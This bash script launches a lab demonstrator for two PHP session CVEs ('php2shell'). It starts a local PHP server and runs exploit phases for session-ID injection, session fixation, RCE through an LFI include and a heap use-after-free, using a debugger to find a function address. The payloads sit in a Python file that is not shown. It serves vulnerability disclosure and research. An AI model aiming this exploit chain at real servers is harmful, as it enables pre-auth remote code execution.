#!/usr/bin/env bash
# php2shell (CVE-2026-109618 / CVE-2026-109619) — one-command demonstrator.
#
#   ./run.sh              lab config (19h's verified ini): probe, fixate, RCE
#   ./run.sh --stock      stock PHP defaults: probe + abort-based persistence
#   ./run.sh --uaf        also attempt the heap-UAF RCE (best-effort auto-detect)
#   ./run.sh --calif      also run the official calif.io chain (OOM -> stale state)
#   ./run.sh --port 9090  custom port
#   ./run.sh --keep       keep the sessions/ dir afterwards for inspection
set -euo pipefail
cd "$(dirname "$0")"

PORT=8080; STOCK=no; UAF=no; CALIF=no; KEEP=no
while [ $# -gt 0 ]; do
  case "$1" in
    --port) PORT="$2"; shift 2;;
    --stock) STOCK=yes; shift;;
    --uaf) UAF=yes; shift;;
    --calif) CALIF=yes; shift;;
    --keep) KEEP=yes; shift;;
    -h|--help) grep '^# ' "$0" | sed 's/^# //'; exit 0;;
    *) echo "unknown arg: $1 (see --help)" >&2; exit 2;;
  esac
done

PY="$(command -v python3)"
PHP_BIN="$(command -v php || true)"
[ -z "$PHP_BIN" ] && [ -x /opt/homebrew/bin/php ] && PHP_BIN=/opt/homebrew/bin/php
[ -z "$PHP_BIN" ] && [ -x /usr/local/bin/php ] && PHP_BIN=/usr/local/bin/php

SESSIONS="$PWD/sessions"
rm -rf "$SESSIONS"; mkdir -p "$SESSIONS"

SRV_PID=""
CALIF_PID=""
cleanup() {
  [ -n "$SRV_PID" ] && kill "$SRV_PID" 2>/dev/null || true
  [ -n "$CALIF_PID" ] && kill "$CALIF_PID" 2>/dev/null || true
  [ -n "${DOCKER_ID:-}" ] && docker rm -f "$DOCKER_ID" >/dev/null 2>&1 || true
  if [ "$KEEP" != yes ]; then rm -rf "$SESSIONS"; fi
}
trap cleanup EXIT

if [ -n "$PHP_BIN" ]; then
  echo "[*] using local PHP: $PHP_BIN ($("$PHP_BIN" -v | head -1))"
  if [ "$STOCK" = yes ]; then
    INI_FLAGS=""   # everything at PHP defaults
  else
    INI_FLAGS="-d max_multipart_body_parts=4 -d session.upload_progress.min_freq=0 -d session.upload_progress.cleanup=0"
  fi
  # shellcheck disable=SC2086
  "$PHP_BIN" $INI_FLAGS -d session.save_path="$SESSIONS" \
    -d display_errors=0 -S "127.0.0.1:$PORT" -t app >/dev/null 2>"$SESSIONS/php-server.log" &
  SRV_PID=$!
else
  echo "[*] no local PHP found — using Docker (php:8.4-cli)"
  if command -v docker >/dev/null; then
    DOCKER_ID=$(docker run -d --rm \
      -p "$PORT:8080" \
      -v "$PWD/app:/var/www/html" \
      -v "$PWD/ini/zz-lab.ini:/usr/local/etc/php/conf.d/zz-lab.ini" \
      php:8.4-cli sh -c "mkdir -p /tmp/sessdata && php -d session.save_path=/tmp/sessdata -S 0.0.0.0:8080")
    SESSIONS="/tmp/sessdata"   # inside the container; RCE evidence comes back over HTTP
  else
    echo "need PHP (brew install php) or Docker" >&2; exit 1
  fi
fi

# Wait for the server to accept connections.
READY=no
for _ in $(seq 1 50); do
  if "$PY" -c "import socket,sys; s=socket.socket(); s.settimeout(0.2); sys.exit(0 if s.connect_ex(('127.0.0.1',$PORT))==0 else 1)" 2>/dev/null; then
    READY=yes; break
  fi
  sleep 0.2
done
if [ "$READY" != yes ]; then
  echo "server did not come up on port $PORT; log:" >&2
  [ -f "$SESSIONS/php-server.log" ] && tail -5 "$SESSIONS/php-server.log" >&2
  exit 1
fi

CFGNAME=$([ "$STOCK" = yes ] && echo "stock defaults" || echo "lab (19h verified)")
echo
echo "==========================================================================="
echo " php2shell demonstrator — CVE-2026-109618 / CVE-2026-109619"
echo " target : http://127.0.0.1:$PORT   config: $CFGNAME"
echo "==========================================================================="

"$PY" exploit/php2shell.py probe  --port "$PORT" || true
"$PY" exploit/php2shell.py fixate --port "$PORT" || true

if [ "$STOCK" = yes ]; then
  "$PY" exploit/php2shell.py abort --port "$PORT" || true
else
  "$PY" exploit/php2shell.py rce --port "$PORT" --save-path "$SESSIONS" || true
fi

if [ "$CALIF" = yes ] && [ -n "$PHP_BIN" ]; then
  # The official chain needs STOCK settings (cleanup=On) plus a low memory_limit
  # so the OOM hits fast. Run it on a second server (PORT+1) to keep the lab
  # phases' config intact. memory_limit=8M is a demo-speed convenience; the same
  # request shape works against the default 128M with more parts.
  CPORT=$((PORT + 1))
  echo
  echo "[*] starting calif-chain server on :$CPORT (stock config, memory_limit=8M)"
  # shellcheck disable=SC2086
  "$PHP_BIN" -d memory_limit=8M -d display_errors=1 \
    -d session.save_path="$SESSIONS" -S "127.0.0.1:$CPORT" -t app >/dev/null 2>"$SESSIONS/php-calif.log" &
  CALIF_PID=$!
  for _ in $(seq 1 50); do
    if "$PY" -c "import socket,sys; s=socket.socket(); s.settimeout(0.2); sys.exit(0 if s.connect_ex(('127.0.0.1',$CPORT))==0 else 1)" 2>/dev/null; then
      break
    fi
    sleep 0.2
  done
  "$PY" exploit/php2shell.py calif --port "$CPORT" || true
fi

if [ "$UAF" = yes ]; then
  echo
  DTOR=""
  if [ -n "$SRV_PID" ] && command -v lldb >/dev/null; then
    DTOR=$(lldb -p "$SRV_PID" -batch -o "image lookup -n zval_ptr_dtor" -o quit 2>/dev/null \
      | awk '/zval_ptr_dtor/ {for(i=1;i<=NF;i++) if($i ~ /^0x/) {print $i; exit}}' || true)
  elif [ -n "$SRV_PID" ] && command -v gdb >/dev/null; then
    DTOR=$(gdb -p "$SRV_PID" -batch -ex "info address zval_ptr_dtor" 2>/dev/null \
      | awk '/zval_ptr_dtor/ {print $3; exit}' || true)
  fi
  if [ -n "$DTOR" ]; then
    echo "[*] auto-detected zval_ptr_dtor = $DTOR"
    "$PY" exploit/php2shell.py uaf --port "$PORT" --dtor "$DTOR" || true
  else
    echo "[*] could not auto-detect zval_ptr_dtor (need lldb/gdb + access to the"
    echo "    server process). Skip, or pass it manually:"
    echo "      python3 exploit/php2shell.py uaf --port $PORT --dtor 0x..."
  fi
fi

echo
echo "==========================================================================="
echo " done. Summary:"
echo "   P1  cookie-less session-ID injection .... pre-auth, stock config"
echo "   P2  attacker-controlled session content . needs cleanup=0 or a bail"
echo "   P3  orphaned persistence ............... parse bail / connection abort"
echo "   P4  end-to-end session fixation ........ pre-auth, stock config"
echo "   R   pre-auth RCE via LFI include ....... needs an app with an include sink"
if [ "$CALIF" = yes ]; then
echo "   109618/19 official chain (calif) ....... OOM fatal -> stale session state"
fi
echo "   UAF heap RCE (eness) ................... build/allocator sensitive"
if [ "$KEEP" = yes ]; then
  echo "   session files kept in: $SESSIONS"
fi
echo "==========================================================================="
